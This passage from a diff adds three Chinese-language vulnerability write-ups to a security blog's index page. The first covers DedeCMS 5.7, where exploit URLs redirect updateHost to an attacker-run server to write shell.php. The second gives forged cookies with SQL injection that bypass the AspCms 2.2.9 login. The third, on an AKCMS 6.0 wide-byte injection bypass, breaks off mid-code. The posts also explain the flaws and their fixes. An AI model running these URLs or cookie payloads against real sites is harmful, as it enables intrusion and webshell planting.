@@ -150,6 +150,480 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-DedeCMS-5-7-远程文件包含漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/03/DedeCMS-5-7-远程文件包含漏洞/">DedeCMS 5.7 远程文件包含漏洞</a>
+    </h1>
+  
+
+        
+        <a href="/2018/12/03/DedeCMS-5-7-远程文件包含漏洞/" class="archive-article-date">
+  	<time datetime="2018-12-03T11:49:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-03</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p><strong>DedeCMS</strong></p>
+<p>DedeCMS又称织梦CMS，是集简单、健壮、灵活、开源几大特点的开源内容管理系统，是国内开源CMS的领先品牌，目前程序安装量已达七十万，超过六成的站点正在使用织梦CMS或基于织梦CMS核心开发。</p>
+<p><strong>漏洞介绍</strong></p>
+<p>在DedeCMS 5.7版本的<code>install\index.bak</code>处过滤不严格，可任意代码执行，导致Getshell。</p>
+<p><strong>影响范围</strong></p>
+<p>&lt; = V5.7 SP1</p>
+<p><strong>文件包含</strong></p>
+<p>文件包含（Local File Include）是php脚本的一大特色，程序员们为了开发的方便，常常会用到包含。</p>
+<p>比如把一系列功能函数都写进fuction.php中，之后当某个文件需要调用的时候就直接在文件头中写上一句&lt;?php include fuction.php?&gt;就可以调用内部定义的函数。</p>
+<p>本地包含漏洞是PHP中一种典型的高危漏洞. 服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件。成功利用时可以使web server会将特定文件当成php执行，从而导致用户可获取一定的服务器权限。</p>
+<p><strong>漏洞危害</strong></p>
+<p>攻击者可以利用文件包含漏洞，获取网站Shell，甚至对服务器造成一定威胁。</p>
+<p>借用漏洞向服务器写入 webshell</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>查看代码<code>/install/index.php.bak</code> 中部分代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">Array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $_request)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_k =&gt; $_v) $&#123;$_k&#125; = RunMagicQuotes($_v);</span><br><span class="line">&#125;<span class="comment">//这里导致了可以变量覆盖</span></span><br></pre></td></tr></table></figure>
+<p>从<code>$_GET，$_POST，$_COOKIE</code>里面遍历初始化变量，${$_k} = xxxx，假设之前已经存在一个变量 a，如果k的值内容为a，就可以把之前a变量的值给覆盖掉，很明显的一个变量覆盖。</p>
+<p>继续往下看：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($step==<span class="number">11</span>)  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'../data/admin/config_update.php'</span>);  </span><br><span class="line">    $rmurl = $updateHost.<span class="string">"dedecms/demodata.&#123;$s_lang&#125;.txt"</span>;  </span><br><span class="line"></span><br><span class="line">    $sql_content = file_get_contents($rmurl);  </span><br><span class="line">    $fp = fopen($install_demo_name,<span class="string">'w'</span>);  </span><br><span class="line">    <span class="keyword">if</span>(fwrite($fp,$sql_content))  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'  [√] 存在(您可以选择安装进行体验)'</span>;  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'  [×] 远程获取失败'</span>;  </span><br><span class="line">    <span class="keyword">unset</span>($sql_content);  </span><br><span class="line">    fclose($fp);  </span><br><span class="line">    <span class="keyword">exit</span>();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先读了一下rmurl这个变量所指向的文件，读完之后放到sql_content变量，最后打开一个文件，把内容写进去。跟进一下updateHost这个变量。</p>
+<p><code>$updateHost</code>变量是通过包含<code>../data/admin/config_update.php</code>这个文件获得的:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 更新服务器，如果有变动，请到 http://bbs.dedecms.com 查询</span><br><span class="line"> *</span><br><span class="line"> * @version        $Id: config_update.php 1 11:36 2011-2-21 tianya $</span><br><span class="line"> * @package        DedeCMS.Administrator</span><br><span class="line"> * @copyright      Copyright (c) 2007 - 2010, DesDev, Inc.</span><br><span class="line"> * @license        http://help.dedecms.com/usersguide/license.html</span><br><span class="line"> * @link           http://www.dedecms.com</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">//更新服务器，如果有变动，请到 http://bbs.dedecms.com 查询</span><br><span class="line">$updateHost = &apos;http://updatenew.dedecms.com/base-v57/&apos;;</span><br><span class="line">$linkHost = &apos;http://flink.dedecms.com/server_url.php&apos;;</span><br></pre></td></tr></table></figure>
+<p>定义了一个字符串，而字符串是一个远程的地址，如果我们将updateHost篡改成自己的服务器，再通过变量覆盖，就能写入任意的字符串。</p>
+<p>因此我们的利用方法如下：</p>
+<p><strong>利用变量覆盖伪造rmurl地址，即控制updateHost</strong></p>
+<p><strong>利用变量覆盖$install_demo_name 可对服务器指定位置写文件。</strong></p>
+<p>首先访问如下地址，通过变量覆盖，将<code>install_demo_name</code>覆盖成为<code>config_update.php</code>文件，也就是将原文件清空。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxxx/install/index.php.bak?step=11&amp;insLockfile=x&amp;s_lang=x&amp;install_demo_name=../data/admin/config_update.php</span><br></pre></td></tr></table></figure>
+<p>然后在本地搭建一个PHP环境，并在phpstudy安装目录的www目录下创建文件夹dedecms，最后在文件夹中新建文件demodata.x.txt，并写入如下内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>接下来需要将demodata.x.txt中的内容写入到目标网站的根目录shell.php文件下。</p>
+<p>访问如下地址：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxxxx/install/index.php.bak?step=11&amp;insLockfile=x&amp;s_lang=x&amp;install_demo_name=../shell.php&amp;updateHost=http://172.16.11.2/</span><br></pre></td></tr></table></figure>
+<p>这样就在目标站点的根目录下写入了shell.php，并在里面写入了我们提前构造好的内容</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先访问之前构造好的地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.ichunqiu/install/index.php.bak?step=11&amp;insLockfile=x&amp;s_lang=x&amp;install_demo_name=../data/admin/config_update.php</span><br></pre></td></tr></table></figure>
+<p>将文件替换并清空。接下在本地搭建PHP环境，在phpstudy安装目录的www目录下创建文件夹dedecms，最后在文件夹中新建文件demodata.x.txt，并写入如下内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这时，本地就准备就绪了，下面直接将txt文档中的内容写入到目标网站根目录，访问：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.ichunqiu/install/index.php.bak?step=11&amp;insLockfile=x&amp;s_lang=x&amp;install_demo_name=../shell.php&amp;updateHost=http://172.16.11.2/</span><br></pre></td></tr></table></figure>
+<p>访问<code>http://xxx/shell.php</code></p>
+<p>可以看到，成功的创建了shell.php</p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><strong>修复方案</strong></p>
+<p>1.删除install目录</p>
+<p>2.把以下代码移动至首行,防止变量被覆盖</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foreach(Array(&apos;_GET&apos;,&apos;_POST&apos;,&apos;_COOKIE&apos;) as $_request)</span><br><span class="line">&#123;</span><br><span class="line">    foreach($$_request as $_k =&gt; $_v) $&#123;$_k&#125; = RunMagicQuotes($_v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>或直接升级版本。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/12/03/DedeCMS-5-7-远程文件包含漏洞/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-AspCms-2-2-9-登录绕过漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/03/AspCms-2-2-9-登录绕过漏洞/">AspCms 2.2.9 登录绕过漏洞</a>
+    </h1>
+  
+
+        
+        <a href="/2018/12/03/AspCms-2-2-9-登录绕过漏洞/" class="archive-article-date">
+  	<time datetime="2018-12-03T06:19:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-03</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p><strong>AspCms</strong></p>
+<p>ASPCMS是为中国企业重新设计的人性化后台，方便、简洁、实用、易用等特点。目前累计用户超40万，是目前中国本土最多使用量的企业建站类源码之一。</p>
+<p><strong>登录绕过漏洞</strong></p>
+<p>由于程序设计过程中认证逻辑存在缺陷，攻击者可以通过构造的账号和口令或者是访问某个页面、修改Cookie等方式绕过登录认证。</p>
+<p><strong>漏洞介绍</strong></p>
+<p>ASPCMS是国内一款非常流行的CMS 建站系统，其2.2.9版CommonFun.asp文件，函数ChecklLogin出现问题，导致攻击者可以绕过登录。</p>
+<p><strong>影响范围</strong></p>
+<p>AspCms 2.2.9</p>
+<p><strong>漏洞危害</strong></p>
+<p>攻击者通过登录绕过漏洞，直接进入后台系统，可随意操控后台数据，对网站甚至服务器，造成很大的损失。</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>漏洞出现<code>inc/AspCms_CommonFun.asp</code> :</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">checkLogin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> <span class="title">if</span> <span class="title">isnul</span><span class="params">(rCookie<span class="params">(<span class="string">"adminName"</span>)</span>)</span> <span class="title">or</span> <span class="title">rCookie</span><span class="params">(<span class="string">"adminName"</span>)</span>="" <span class="title">then</span> </span></span><br><span class="line"><span class="function">  <span class="title">alertMsgAndGo</span>"您还没有登陆","/"</span></span><br><span class="line"><span class="function"> <span class="title">else</span></span></span><br><span class="line"><span class="function">  <span class="title">dim</span> <span class="title">Permissions</span></span></span><br><span class="line"><span class="function">  <span class="title">Permissions</span>=<span class="title">rCookie</span><span class="params">(<span class="string">"groupMenu"</span>)</span></span></span><br><span class="line"><span class="function">  <span class="title">if</span> <span class="title">Permissions</span>&lt;&gt;"<span class="title">all</span>" <span class="title">and</span> <span class="title">isnul</span><span class="params">(Permissions)</span> <span class="title">then</span></span></span><br><span class="line"><span class="function">   <span class="title">alertMsgAndGo</span>"您没有访问权限","-1"</span></span><br><span class="line"><span class="function">  <span class="title">end</span> <span class="title">if</span></span></span><br><span class="line"><span class="function"> <span class="title">end</span> <span class="title">if</span></span></span><br><span class="line"><span class="function"> <span class="title">dim</span> <span class="title">sql</span></span></span><br><span class="line"><span class="function"> <span class="title">if</span> <span class="title">not</span> <span class="title">isnum</span><span class="params">(rCookie<span class="params">(<span class="string">"adminrand"</span>)</span>)</span> <span class="title">then</span> <span class="title">alertMsgAndGo</span>"您没有访问权限","-1" <span class="title">end</span> <span class="title">if</span></span></span><br><span class="line"><span class="function"> <span class="title">sql</span> = "<span class="title">select</span> <span class="title">count</span><span class="params">(*)</span> <span class="title">from</span> </span>&#123;prefix&#125;User where LoginName = <span class="string">'"&amp; rCookie("adminName") &amp;"'</span> <span class="keyword">and</span> adminrand=<span class="string">'"&amp;rCookie("adminrand")&amp;"'</span><span class="string">"</span></span><br><span class="line"><span class="string"> Dim rscoo : Set rscoo=Conn.Exec(sql,"</span>r1<span class="string">")</span></span><br><span class="line"><span class="string"> if rscoo(0)&lt;&gt;1 then</span></span><br><span class="line"><span class="string">   wCookie"</span>adminName<span class="string">","</span><span class="string">"</span></span><br><span class="line"><span class="string">   wCookie"</span>adminId<span class="string">","</span><span class="string">"</span></span><br><span class="line"><span class="string">   wCookie"</span>groupMenu<span class="string">","</span><span class="string">"</span></span><br><span class="line"><span class="string">   wCookie"</span>SceneMenu<span class="string">","</span><span class="string">"</span></span><br><span class="line"><span class="string">      alertMsgAndGo"</span>您没有访问权限<span class="string">","</span><span class="number">-1</span><span class="string">"</span></span><br><span class="line"><span class="string"> end if</span></span><br><span class="line"><span class="string">End Function</span></span><br></pre></td></tr></table></figure>
+<p>系统通过checkLogin函数，来判断是否登录成功。我们可以看到使用了三个if语句进行检查，我们接下来依次进行分析：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">checkLogin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> <span class="title">if</span> <span class="title">isnul</span><span class="params">(rCookie<span class="params">(<span class="string">"adminName"</span>)</span>)</span> <span class="title">or</span> <span class="title">rCookie</span><span class="params">(<span class="string">"adminName"</span>)</span>="" <span class="title">then</span> </span></span><br><span class="line"><span class="function">  <span class="title">alertMsgAndGo</span>"您还没有登陆","/"</span></span><br><span class="line"><span class="function"> <span class="title">else</span></span></span><br><span class="line"><span class="function">  <span class="title">dim</span> <span class="title">Permissions</span></span></span><br><span class="line"><span class="function">  <span class="title">Permissions</span>=<span class="title">rCookie</span><span class="params">(<span class="string">"groupMenu"</span>)</span></span></span><br><span class="line"><span class="function">  <span class="title">if</span> <span class="title">Permissions</span>&lt;&gt;"<span class="title">all</span>" <span class="title">and</span> <span class="title">isnul</span><span class="params">(Permissions)</span> <span class="title">then</span></span></span><br><span class="line"><span class="function">   <span class="title">alertMsgAndGo</span>"您没有访问权限","-1"</span></span><br><span class="line"><span class="function">  <span class="title">end</span> <span class="title">if</span></span></span><br><span class="line"><span class="function"> <span class="title">end</span> <span class="title">if</span></span></span><br><span class="line"><span class="function"> <span class="title">dim</span> <span class="title">sql</span></span></span><br></pre></td></tr></table></figure>
+<p>第一个判断，如果adminname的值为空，则跳出循环，并弹窗提示登录。</p>
+<p>这里只是判断了值是否为空，我们可以给adminname随意赋一个值，就可以跳过这层的判断。</p>
+<p>第二个判断，定义了一个Permissions，他从cookie中取groupMenu的值，如果不等于all，并且为空，就会拒绝访问。</p>
+<p>因为cookie是用户可控的，这里只需将groupMenu的值改为all，就可以跳过这层判断。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">dim sql</span><br><span class="line">  <span class="keyword">if</span> not isnum(rCookie(<span class="string">"adminrand"</span>)) then alertMsgAndGo<span class="string">"您没有访问权限"</span>,<span class="string">"-1"</span> end <span class="keyword">if</span></span><br><span class="line"> sql = <span class="string">"select count(*) from &#123;prefix&#125;User where LoginName = '"</span>&amp; rCookie(<span class="string">"adminName"</span>) &amp;<span class="string">"' and adminrand='"</span>&amp;rCookie(<span class="string">"adminrand"</span>)&amp;<span class="string">"'"</span></span><br><span class="line"> Dim rscoo : Set rscoo=Conn.Exec(sql,<span class="string">"r1"</span>)</span><br><span class="line"> <span class="keyword">if</span> rscoo(<span class="number">0</span>)&lt;&gt;<span class="number">1</span> then</span><br><span class="line">   wCookie<span class="string">"adminName"</span>,<span class="string">""</span></span><br><span class="line">   wCookie<span class="string">"adminId"</span>,<span class="string">""</span></span><br><span class="line">   wCookie<span class="string">"groupMenu"</span>,<span class="string">""</span></span><br><span class="line">   wCookie<span class="string">"SceneMenu"</span>,<span class="string">""</span></span><br><span class="line">      alertMsgAndGo<span class="string">"您没有访问权限"</span>,<span class="string">"-1"</span></span><br><span class="line"> end <span class="keyword">if</span></span><br><span class="line">End <span class="function"><span class="keyword">Function</span></span></span><br></pre></td></tr></table></figure>
+<p>第三个判断，如果adminrand的值不是数字，然后就会跳出。系统下面进行了sql查询，但是其中的adminrand用户可控，并且无过滤，接下来判断是否返回了一个1，如果返回1，则证明数据库中有我们传入的值。因此可以给adminName赋值为 admin ‘ or ‘ 1 ‘ = ’ 1 ‘。这样就能绕过第三层验证了。</p>
+<p>通过以上分析，我们得出结论，将cookie修改为如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">groupMenu=all;</span><br><span class="line">adminrand=1;</span><br><span class="line">adminName=admin&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">languageID=1;</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.cookie=&quot;groupMenu=all;&quot;;</span><br><span class="line">document.cookie=&quot;adminrand=1;&quot;;</span><br><span class="line">document.cookie=&quot;adminName=admin&apos; or &apos;1&apos;=&apos;1;&quot;;</span><br><span class="line">document.cookie=&quot;languageID=1;&quot;;</span><br></pre></td></tr></table></figure>
+<p>可直接登录后台<code>xxx/admin_aspcms/</code></p>
+<h3 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h3><p>在本漏洞中，只需将Cookie替换成为Session，就可以避免此漏洞的产生。</p>
+<p>或者直接升级版本即可。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/12/03/AspCms-2-2-9-登录绕过漏洞/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-AKCMS-6-0-登录绕过漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/03/AKCMS-6-0-登录绕过漏洞/">AKCMS 6.0 登录绕过漏洞</a>
+    </h1>
+  
+
+        
+        <a href="/2018/12/03/AKCMS-6-0-登录绕过漏洞/" class="archive-article-date">
+  	<time datetime="2018-12-03T05:46:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-03</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p><strong>AKCMS</strong></p>
+<p>它是一个运行在PHP下的免费CMS，小巧灵活，速度快、兼容性好、能适应各种主机，适合二次开发。</p>
+<p><strong>漏洞介绍</strong></p>
+<p>由于AKCMS 6.0采用GBK编码，过滤不严谨，导致可以利用宽字节注入而绕过登录。</p>
+<p><strong>影响范围</strong></p>
+<p>AKCMS 6.0</p>
+<p><strong>漏洞危害</strong></p>
+<p>攻击者可以通过此漏洞直接获取网站后台权限，威胁网站信息，一旦拿到Webshell，会对服务器的安全造成巨大的威胁。</p>
+<p><strong>登录绕过漏洞</strong></p>
+<p>由于程序设计过程中认证逻辑存在缺陷，攻击者可以通过构造的账号和口令或者是访问某个页面、修改Cookie等方式绕过登录认证。</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>首先来查看一下这个CMS的登录流程，入口在<code>index.php</code> ：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($get_app)) &#123;</span><br><span class="line"> $app = $get_app;</span><br><span class="line"> <span class="keyword">include</span> AK_ROOT.<span class="string">'include/admin.inc.php'</span>;</span><br><span class="line"> <span class="keyword">include</span> AK_ROOT.<span class="string">'include/app.inc.php'</span>;</span><br><span class="line"> $file = AK_ROOT.<span class="string">'configs/apps/'</span>.$app.<span class="string">'/program/index.php'</span>;</span><br><span class="line"> <span class="keyword">if</span>(file_exists($file)) <span class="keyword">require</span> $file;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> $file = <span class="string">'install'</span>;</span><br><span class="line"> <span class="keyword">if</span>(ifinstalled()) $file = <span class="string">'admincp'</span>;</span><br><span class="line"> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET[<span class="string">'file'</span>])) $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"> <span class="keyword">if</span>(!in_array($file, <span class="keyword">array</span>(<span class="string">'account'</span>, <span class="string">'admincp'</span>, <span class="string">'db'</span>, <span class="string">'customer'</span>, <span class="string">'install'</span>, <span class="string">'login'</span>, <span class="string">'setting'</span>, <span class="string">'upload'</span>, <span class="string">'welcome'</span>, <span class="string">'upgrade'</span>, <span class="string">'repair'</span>, <span class="string">'theme'</span>, <span class="string">'app'</span>, <span class="string">'license'</span>))) <span class="keyword">exit</span>;</span><br><span class="line"> <span class="keyword">require</span> CORE_ROOT.$file.<span class="string">'.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在最后几行：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!in_array($file, <span class="keyword">array</span>(<span class="string">'account'</span>, <span class="string">'admincp'</span>, <span class="string">'db'</span>, <span class="string">'customer'</span>,  <span class="string">'install'</span>, <span class="string">'login'</span>, <span class="string">'setting'</span>, <span class="string">'upload'</span>, <span class="string">'welcome'</span>, <span class="string">'upgrade'</span>,  <span class="string">'repair'</span>, <span class="string">'theme'</span>, <span class="string">'app'</span>, <span class="string">'license'</span>))) <span class="keyword">exit</span>;</span><br><span class="line"><span class="keyword">require</span> CORE_ROOT.$file.<span class="string">'.php'</span>;</span><br></pre></td></tr></table></figure>
+<p>如果file的值等于login，系统就会调用login.php。</p>
+<p>继续跟进，<code>login.php</code> ：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!defined(<span class="string">'CORE_ROOT'</span>)) <span class="keyword">exit</span>();</span><br><span class="line"><span class="keyword">require_once</span> CORE_ROOT.<span class="string">'include/admin.inc.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($post_loginsubmit)) &#123;</span><br><span class="line"> <span class="keyword">if</span>($editor = $db-&gt;get_by(<span class="string">'*'</span>, <span class="string">'admins'</span>, <span class="string">"editor='"</span>.$db-&gt;addslashes($post_username).<span class="string">"'"</span>)) &#123;</span><br><span class="line">  <span class="keyword">if</span>(ak_md5($post_password, <span class="number">0</span>, <span class="number">2</span>) == $editor[<span class="string">'password'</span>]) &#123;</span><br><span class="line">   <span class="keyword">if</span>($editor[<span class="string">'freeze'</span>] == <span class="number">1</span>) adminmsg($lan[<span class="string">'youarefreeze'</span>], <span class="string">'index.php'</span>, <span class="number">3</span>, <span class="number">1</span>);</span><br><span class="line">   <span class="keyword">if</span>(!<span class="keyword">empty</span>($post_rememberlogin)) &#123;</span><br><span class="line">    setlogin($post_username, $thetime + <span class="number">24</span> * <span class="number">3600</span> * <span class="number">365</span> * <span class="number">10</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    setlogin($post_username);</span><br><span class="line">   &#125;</span><br><span class="line">   $target = <span class="string">'index.php'</span>;</span><br><span class="line">   <span class="keyword">if</span>(ifthemeuninstalled()) $target = <span class="string">'index.php?file=theme&amp;action=themeinstall'</span>;</span><br><span class="line">   adminmsg($lan[<span class="string">'login_success'</span>], $target);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   adminmsg($lan[<span class="string">'login_failed'</span>], <span class="string">'index.php?file=login'</span>, <span class="number">3</span>, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  adminmsg($lan[<span class="string">'login_failed'</span>], <span class="string">'index.php?file=login'</span>, <span class="number">3</span>, <span class="number">1</span>);</span><br><span class="line"> 